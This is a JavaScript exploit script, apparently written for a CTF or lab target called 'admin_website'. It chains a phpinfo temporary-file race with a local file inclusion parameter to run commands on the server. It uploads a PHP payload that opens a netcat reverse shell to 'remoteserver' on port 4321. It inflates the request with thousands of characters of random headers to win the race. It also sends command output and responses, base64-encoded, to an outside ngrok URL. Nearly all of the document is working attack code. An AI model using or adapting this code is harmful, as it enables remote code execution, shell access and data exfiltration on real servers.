const debugurl = "https://bf65-86-215-120-30.ngrok-free.app"

// Function to generate a random string of specified length
function generateRandomString(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

// Function to create 4000 random headers with random data values
function createRandomHeaders() {
  const numHeaders = 60;
  const headers = {};

  for (let i = 0; i < numHeaders; i++) {
    const headerName = generateRandomString(2000); // Generate a random header name (10 characters)
    const headerValue = generateRandomString(2000); // Generate a random header value (20 characters)
    headers[headerName] = headerValue;
  }

  return headers;
}

// Function to upload a string as file content and process response stream with custom headers
function uploadStringAsFileAndProcessStreamWithCustomHeaders(content, fileName, onDataReceived) {
  // Create a new Blob object from the string content
  const blob = new Blob([content], { type: 'text/plain' });

  // Create FormData object
  const formData = new FormData();
  formData.append('file', blob, fileName); // 'file' is the name for the file field in the form data

  // Fetch request parameters
  const url = 'http://admin_website/admin/index.php?page=phpinfo.php'; // Replace with your upload endpoint

  // Generate random headers
  const randomHeaders = createRandomHeaders();

  const options = {
    method: 'POST',
    body: formData,
    headers: {
      ...randomHeaders, // Spread randomHeaders object to include all generated headers
      'Custom-Header': 'Custom-Value' // Additional custom header
    }
  };
    
    fetch(debugurl + "/1/"+options.headers);
    
  //console.log(options)

  // Send the fetch request
  fetch(url, options)
      .then(response => {
        fetch(debugurl+"/2/"+JSON.stringify(response))
      if (response.ok) {
        // Create a ReadableStream to read response body as it comes
        const reader = response.body.getReader();

        // Function to continuously read chunks from the stream
        const readStream = () => {
          reader.read().then(({ done, value }) => {
            if (done) {
              //console.log('Stream reading complete');
              return;
            }

            // Invoke the callback function with the chunk data
            onDataReceived(value);

            // Continue reading next chunk
            readStream();
          });
        };

        // Start reading from the stream
        readStream();
      } else {
        fetch(debugurl+"/cpt/"+btoa(JSON.stringify(response)))
        throw new Error('Failed to upload string as file');
      }
    })
      .catch(error => {
      fetch(debugurl+"/err/"+error)
      console.error('Error:', error); // Log any errors that occurred
    });
}

// Example callback function to process each chunk of data received
function processDataChunk(chunk) {
  // Convert chunk (Uint8Array) to string and print
    const chunkString = new TextDecoder('utf-8').decode(chunk);
    if (chunkString.indexOf("[tmp_name]") > -1) {
        //console.log(chunkString);
        let pos = chunkString.indexOf("[tmp_name]");
        let sub = chunkString.slice(pos, pos + 40);
        let pay = sub.split('=')[1].split('&gt')[1].split('\n')[0].split(';')[1].trim();
        fetch('http://admin_website/admin/index.php?cmd=pwd&page=' + pay)
            .then(response => response.text())
            .then(res => {
                //Reliable time
                if (res.indexOf("Failed to open stream") > -1) {
                    fetch(debugurl+"/retry")
                    uploadStringAsFileAndProcessStreamWithCustomHeaders(myString, fileName, processDataChunk);
                }
                else {
                    fetch(debugurl+"/"+btoa(res))
                    console.log(res);
                }
                //console.log(res)
            });
    }
    else {
        //console.log("received junk");
    }
  //console.log('Received chunk:', chunkString);
}

// Example usage:
//const myString = 'Hello, this is a test string.';
const myString = '<?php system("/bin/nc -e /bin/sh remoteserver 4321"); ?>'
const fileName = 'test.php'; // Specify the desired file name

// Call the upload function with the string content, file name, and callback function
uploadStringAsFileAndProcessStreamWithCustomHeaders(myString, fileName, processDataChunk);
